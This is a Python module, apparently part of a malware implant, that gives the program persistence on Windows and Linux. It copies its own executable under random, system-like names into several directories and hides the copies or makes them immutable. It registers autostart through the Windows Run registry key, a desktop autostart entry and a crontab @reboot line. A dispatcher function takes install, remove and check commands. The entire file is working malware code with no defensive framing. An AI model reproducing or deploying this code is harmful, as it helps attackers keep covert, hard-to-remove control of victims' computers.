# modules/persistence.py

import os
import sys
import shutil
import getpass
import platform
import subprocess
import random
import string

PERSIST_PATHS = []

def random_name(extension=".exe"):
    # Genera nombre random tipo svhost123.exe
    base = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{base}{extension}"

def get_system_paths():
    paths = []
    user = getpass.getuser()
    if os.name == "nt":
        # Windows
        base_appdata = os.environ.get('APPDATA') or os.path.expanduser("~\\AppData\\Roaming")
        candidates = [
            os.path.join(base_appdata, random_name()),
            os.path.join(base_appdata, "Microsoft\\Windows\\", random_name()),
            os.path.join(base_appdata, "Microsoft\\Windows\\Start Menu\\Programs\\Startup", random_name()),
            os.path.join("C:\\ProgramData\\", random_name())
        ]
        paths.extend([os.path.abspath(p) for p in candidates])
    else:
        # Linux
        home = os.path.expanduser("~")
        candidates = [
            os.path.join(home, ".config", random_name("")),
            os.path.join(home, ".local", "bin", random_name("")),
            os.path.join("/usr/local/bin", random_name("")),
            os.path.join("/tmp", random_name(""))
        ]
        paths.extend([os.path.abspath(p) for p in candidates])
    return paths

def protect_file(path):
    try:
        if os.name == "nt":
            os.system(f'attrib +h +s +r "{path}"')
        else:
            os.chmod(path, 0o700)
            subprocess.run(["chattr", "+i", path], stderr=subprocess.DEVNULL)
    except Exception:
        pass

def add_startup(path):
    if os.name == "nt":
        # Copia a startup (autoarranque)
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            regpath = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, regpath, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "SysDrv", 0, winreg.REG_SZ, path)
        except Exception:
            pass
    else:
        # Crea .desktop y crontab en Linux
        desktop = os.path.expanduser(f"~/.config/autostart/{random_name('.desktop')}")
        with open(desktop, "w") as f:
            f.write(f"[Desktop Entry]\nType=Application\nExec={path}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=SysDrv\n")
        subprocess.run(f'(crontab -l; echo "@reboot {path}") | crontab -', shell=True, stderr=subprocess.DEVNULL)

def persist_multicopy():
    paths = get_system_paths()
    main_bin = os.path.abspath(sys.argv[0])
    for p in paths:
        try:
            if not os.path.exists(p) or (os.path.getsize(p) != os.path.getsize(main_bin)):
                shutil.copy2(main_bin, p)
                protect_file(p)
                add_startup(p)
                PERSIST_PATHS.append(p)
        except Exception:
            continue
    return PERSIST_PATHS

def remove_persist():
    for p in get_system_paths():
        try:
            if os.path.exists(p):
                if os.name != "nt":
                    subprocess.run(["chattr", "-i", p], stderr=subprocess.DEVNULL)
                os.remove(p)
        except Exception:
            continue
    # Elimina startup
    if os.name == "nt":
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            regpath = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, regpath, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.DeleteValue(reg, "SysDrv")
        except Exception:
            pass
    else:
        # Quita crontab y .desktop
        desktop_dir = os.path.expanduser("~/.config/autostart/")
        for f in os.listdir(desktop_dir):
            if "SysDrv" in f:
                try:
                    os.remove(os.path.join(desktop_dir, f))
                except Exception:
                    pass
        # Borra crontab entries
        subprocess.run("crontab -l | grep -v SysDrv | crontab -", shell=True, stderr=subprocess.DEVNULL)

def run(cmd, *args):
    if cmd == "install":
        persist_multicopy()
        return "[+] Persistencia multinivel instalada."
    elif cmd == "remove":
        remove_persist()
        return "[+] Persistencia eliminada."
    elif cmd == "check":
        copies = [p for p in get_system_paths() if os.path.exists(p)]
        return f"Copias detectadas: {copies}"
    else:
        return "[!] Comando no soportado en persistence."


